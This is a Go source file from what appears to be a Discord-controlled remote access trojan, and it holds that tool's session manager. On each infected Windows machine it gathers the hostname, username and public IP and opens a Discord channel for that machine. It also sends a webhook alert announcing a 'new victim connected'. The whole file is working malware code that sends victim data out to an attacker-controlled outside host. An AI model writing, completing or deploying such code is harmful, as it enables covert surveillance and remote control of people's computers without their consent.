//go:build windows

package bot

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"log/slog"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/local/govoid/internal/commands"
	"github.com/local/govoid/internal/config"
	"github.com/local/govoid/internal/util"
)

type Session struct {
	ID          string
	ChannelID   string
	Hostname    string
	Username    string
	IP          string
	ConnectedAt time.Time
	SessionNum  int
}

var (
	CurrentSession *Session
	sessionMu      sync.RWMutex
	instanceID     = loadOrCreateInstanceID()
)

func newInstanceID() string {
	buf := make([]byte, 4)
	if _, err := rand.Read(buf); err != nil {
		return fmt.Sprintf("%08x", uint32(time.Now().UnixNano()))
	}
	return hex.EncodeToString(buf)
}

func instanceIDPath() string {
	return filepath.Join(config.StateDir(), "instance.id")
}

func legacyInstanceIDPath() string {
	dir, err := os.UserConfigDir()
	if err != nil || dir == "" {
		return ""
	}
	return filepath.Join(dir, config.DataDirName, "instance.id")
}

func loadOrCreateInstanceID() string {
	path := instanceIDPath()
	if path != "" {
		if raw, err := os.ReadFile(path); err == nil {
			id := strings.TrimSpace(string(raw))
			if len(id) == 8 {
				if _, hexErr := hex.DecodeString(id); hexErr == nil {
					return id
				}
			}
		}
	}

	if legacy := legacyInstanceIDPath(); legacy != "" {
		if raw, err := os.ReadFile(legacy); err == nil {
			id := strings.TrimSpace(string(raw))
			if len(id) == 8 {
				if _, hexErr := hex.DecodeString(id); hexErr == nil {
					if path != "" {
						if mkErr := os.MkdirAll(filepath.Dir(path), 0o700); mkErr == nil {
							_ = os.WriteFile(path, []byte(id), 0o600)
						}
					}
					return id
				}
			}
		}
	}

	id := newInstanceID()
	if path != "" {
		if mkErr := os.MkdirAll(filepath.Dir(path), 0o700); mkErr == nil {
			_ = os.WriteFile(path, []byte(id), 0o600)
		}
	}
	return id
}

func topicMatchesInstance(topic, hostname, username string) bool {
	if topic == "" {
		return false
	}
	if instanceID != "" && strings.Contains(topic, instanceID) {
		return true
	}
	parts := strings.Split(topic, "|")
	if len(parts) < 2 {
		return false
	}
	return strings.TrimSpace(parts[0]) == hostname && strings.TrimSpace(parts[1]) == username
}

func guildChannelsBounded(s *discordgo.Session, limit time.Duration) ([]*discordgo.Channel, error) {
	type result struct {
		channels []*discordgo.Channel
		err      error
	}

	done := make(chan result, 1)
	go func() {
		channels, err := s.GuildChannels(config.GuildID)
		done <- result{channels: channels, err: err}
	}()

	timer := time.NewTimer(limit)
	defer timer.Stop()

	select {
	case r := <-done:
		return r.channels, r.err
	case <-timer.C:
		return nil, fmt.Errorf("sessionmgr: GuildChannels agotó %s", limit)
	}
}

func channelEditBounded(s *discordgo.Session, id string, edit *discordgo.ChannelEdit, limit time.Duration) (*discordgo.Channel, error) {
	type result struct {
		channel *discordgo.Channel
		err     error
	}
	done := make(chan result, 1)
	go func() {
		channel, err := s.ChannelEditComplex(id, edit)
		done <- result{channel: channel, err: err}
	}()
	select {
	case r := <-done:
		return r.channel, r.err
	case <-time.After(limit):
		return nil, fmt.Errorf("sessionmgr: ChannelEditComplex agotó %s", limit)
	}
}

func channelCreateBounded(s *discordgo.Session, guildID string, data discordgo.GuildChannelCreateData, limit time.Duration) (*discordgo.Channel, error) {
	type result struct {
		channel *discordgo.Channel
		err     error
	}
	done := make(chan result, 1)
	go func() {
		channel, err := s.GuildChannelCreateComplex(guildID, data)
		done <- result{channel: channel, err: err}
	}()
	select {
	case r := <-done:
		return r.channel, r.err
	case <-time.After(limit):
		return nil, fmt.Errorf("sessionmgr: GuildChannelCreateComplex agotó %s", limit)
	}
}

func channelEditMessageBounded(s *discordgo.Session, channelID, msgID string, edit *discordgo.MessageEdit, limit time.Duration) (*discordgo.Message, error) {
	type result struct {
		message *discordgo.Message
		err     error
	}
	done := make(chan result, 1)
	go func() {
		message, err := s.ChannelMessageEditComplex(edit)
		done <- result{message: message, err: err}
	}()
	select {
	case r := <-done:
		return r.message, r.err
	case <-time.After(limit):
		return nil, fmt.Errorf("sessionmgr: ChannelMessageEditComplex agotó %s", limit)
	}
}

func currentSession() *Session {
	sessionMu.RLock()
	defer sessionMu.RUnlock()
	return CurrentSession
}

func snapshotSession(session *Session) Session {
	sessionMu.RLock()
	defer sessionMu.RUnlock()
	return *session
}

func ensureSession(s *discordgo.Session) (*Session, error) {
	sessionMu.Lock()
	defer sessionMu.Unlock()

	if CurrentSession != nil && CurrentSession.ChannelID != "" {
		return CurrentSession, nil
	}

	hostname, err := os.Hostname()
	if err != nil || hostname == "" {
		hostname = "desconocido"
	}

	username := "desconocido"
	if current, userErr := user.Current(); userErr == nil {
		username = current.Username
	}

	if cachedID, cachedNum := cachedChannel(); cachedID != "" {
		session := &Session{
			ID:          instanceID,
			ChannelID:   cachedID,
			Hostname:    hostname,
			Username:    username,
			IP:          "desconocida",
			ConnectedAt: time.Now(),
			SessionNum:  cachedNum,
		}
		CurrentSession = session
		commands.SetSessionInfo(session.ID, session.SessionNum, session.ChannelID, session.Hostname, session.Username)
		go refreshCachedSession(s, session)
		go resolveCachedIP(s, session)
		slog.Debug("sessionmgr: canal en caché", "channel", cachedID, "num", cachedNum)
		return session, nil
	}

	channels, err := guildChannelsBounded(s, 20*time.Second)
	if err != nil {
		return nil, fmt.Errorf("sessionmgr: no se pudieron listar canales: %w", err)
	}

	var existing *discordgo.Channel
	maxNum := 0
	for _, channel := range channels {
		if !strings.HasPrefix(channel.Name, config.ChannelPrefix) {
			continue
		}
		raw := strings.TrimPrefix(channel.Name, config.ChannelPrefix)
		if num, parseErr := strconv.Atoi(raw); parseErr == nil && num > maxNum {
			maxNum = num
		}
		if topicMatchesInstance(channel.Topic, hostname, username) {
			existing = channel
		}
	}

	publicIP := util.PublicIP(context.Background())

	if existing != nil {
		num := maxNum
		raw := strings.TrimPrefix(existing.Name, config.ChannelPrefix)
		if parsed, parseErr := strconv.Atoi(raw); parseErr == nil {
			num = parsed
		}
		session := &Session{
			ID:          instanceID,
			ChannelID:   existing.ID,
			Hostname:    hostname,
			Username:    username,
			IP:          publicIP,
			ConnectedAt: time.Now(),
			SessionNum:  num,
		}
		CurrentSession = session
		commands.SetSessionInfo(session.ID, session.SessionNum, session.ChannelID, session.Hostname, session.Username)

		topic := fmt.Sprintf("%s | %s | %s | %s | conectado %s",
			hostname, username, publicIP, instanceID, time.Now().UTC().Format(time.RFC3339))
		go func(channelID, topic string) {
			if _, editErr := channelEditBounded(s, channelID, &discordgo.ChannelEdit{Topic: topic}, 20*time.Second); editErr != nil {
				slog.Debug("sessionmgr: no se pudo refrescar el topic", "err", editErr)
			}
		}(existing.ID, topic)

		slog.Debug("sessionmgr: canal reutilizado", "channel", existing.ID, "num", num)
		saveChannel(existing.ID, num)
		return session, nil
	}

	num := maxNum + 1
	name := fmt.Sprintf("%s%d", config.ChannelPrefix, num)
	topic := fmt.Sprintf("%s | %s | %s | %s | conectado %s",
		hostname, username, publicIP, instanceID, time.Now().UTC().Format(time.RFC3339))

	data := discordgo.GuildChannelCreateData{
		Name:  name,
		Type:  discordgo.ChannelTypeGuildText,
		Topic: topic,
	}
	if config.CategoryID != "" {
		data.ParentID = config.CategoryID
	}

	channel, err := channelCreateBounded(s, config.GuildID, data, 20*time.Second)
	if err != nil {
		return nil, fmt.Errorf("sessionmgr: crear canal: %w", err)
	}

	session := &Session{
		ID:          instanceID,
		ChannelID:   channel.ID,
		Hostname:    hostname,
		Username:    username,
		IP:          publicIP,
		ConnectedAt: time.Now(),
		SessionNum:  num,
	}
	CurrentSession = session
	commands.SetSessionInfo(session.ID, session.SessionNum, session.ChannelID, session.Hostname, session.Username)

	_ = util.PostWebhook("🟢 Nueva víctima conectada", 3066993, []util.EmbedField{
		{Name: "hostname", Value: hostname, Inline: true},
		{Name: "usuario", Value: username, Inline: true},
		{Name: "IP", Value: publicIP, Inline: true},
		{Name: "OS", Value: runtime.GOOS + "/" + runtime.GOARCH, Inline: true},
		{Name: "canal", Value: name, Inline: true},
	})

	saveChannel(channel.ID, num)
	return session, nil
}

func hostnameForWebhook() string {
	if session := currentSession(); session != nil && session.Hostname != "" {
		return session.Hostname
	}
	hostname, err := os.Hostname()
	if err != nil || hostname == "" {
		return "desconocido"
	}
	return hostname
}
